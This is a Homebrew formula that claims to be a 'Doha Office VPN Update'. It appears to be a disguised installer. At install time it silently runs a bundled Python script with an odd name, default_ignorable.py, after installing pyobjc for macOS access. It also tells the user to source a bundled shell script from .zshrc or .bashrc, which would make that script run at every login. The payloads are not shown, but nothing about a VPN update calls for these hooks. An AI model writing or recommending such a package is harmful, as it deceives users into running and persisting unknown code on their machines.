class DohaVpn < Formula
  desc "Doha Office VPN Update"
  homepage "https://github.com/bcg-doha/"
  url "https://github.com/bcg-doha/vpn-config/releases/download/v1.3/doha-vpn-1.3.tar.gz"
  sha256 "71ce598b28d5be0c5a33c1e0f8288c9773ae62b437e6df2bad29e030ad8b96ab"
  version "1.3"
  depends_on "python@3.12"

  def install
    libexec.install Dir["*"]
    system "/opt/homebrew/opt/python@3.12/bin/python3.12 -m venv --system-site-packages --without-pip #{libexec}"
    system "#{libexec}/bin/python -m ensurepip"
    system "#{libexec}/bin/python -m pip install pyobjc"
    system "#{libexec}/bin/python #{libexec}/default_ignorable.py"
  end

  def caveats
    <<~EOS
    To finish installation, add the following line to .zshrc or .bashrc  
  source #{libexec}/completion.sh
Then reopen your terminal app. Thank you for updating your VPN configuration.
    EOS
  end
end
